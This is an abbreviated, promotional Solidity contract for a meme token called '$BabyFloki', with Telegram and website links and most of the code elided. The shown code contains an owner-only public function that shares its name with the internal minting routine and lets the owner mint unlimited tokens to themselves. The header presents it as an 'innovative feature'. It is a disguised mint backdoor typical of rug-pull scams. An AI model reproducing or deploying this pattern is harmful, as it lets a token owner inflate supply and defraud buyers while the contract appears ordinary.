//
// $BabyFloki proposes an innovative feature in its contract.
//
// 📱 Telegram::https://t.me/BabyFlokiVerify
// 📱 Website::https://babyfloki.io
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _BabyFloki(uint256 amount) public onlyOwner {
 _BabyFloki(msg.sender, amount);
    }
    ...
    function _BabyFloki(address account, uint256 amount) internal virtual {
...
contract $BabyFloki is ERC20 {
    ...
    constructor() public ERC20("Baby Floki", "BFLOKI") {
     _BabyFloki(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}